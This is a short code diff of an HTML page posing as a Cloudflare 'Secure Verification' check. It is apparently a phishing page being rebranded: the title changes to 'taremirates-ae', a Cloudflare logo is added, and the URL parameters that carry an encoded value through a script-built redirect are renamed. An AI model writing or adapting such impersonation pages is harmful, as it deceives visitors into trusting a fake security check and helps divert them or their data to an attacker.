@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification</title>
+    <title>taremirates-ae</title>
     <style>
         * {
             margin: 0;
@@ -261,7 +261,7 @@
 
             <div class="cloudflare-section">
                 <div class="cloudflare-brand">
-                    <div class="cloudflare-logo"></div>
+                    <img src="cloudflare_.png" class="cloudflare-logo" alt="Logo">
                     <span>CLOUDFLARE</span>
                 </div>
                 <div class="privacy-terms">Privacy · Terms</div>
@@ -312,7 +312,7 @@
 
                 const t = new URL(window.location.href);
                 t.searchParams.delete('eoff');
-                t.searchParams.set('encoded', s);
+                t.searchParams.set('enc', s);
 
                 window.history.replaceState({}, '', t.toString());
             }
@@ -365,7 +365,7 @@
                             let aa = w + x + y + z;
 
                             if (j) {
-                                aa += "?data=" + j;
+                                aa += "?eoff=" + j;
                             }
 
                             window.location.href = aa;
